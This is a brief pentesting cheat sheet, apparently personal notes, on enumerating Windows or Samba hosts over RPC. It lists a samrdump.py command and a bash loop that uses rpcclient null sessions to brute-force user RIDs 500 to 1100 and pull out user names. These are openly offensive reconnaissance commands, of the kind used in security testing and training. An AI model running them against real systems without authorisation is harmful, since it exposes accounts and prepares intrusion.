# RPC - rpcclient


## rpc - samrdump.py
```
samrdump.py <IP>
```

## rpc - bash User ID bruteforce
```
for i in $(seq 500 1100);do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
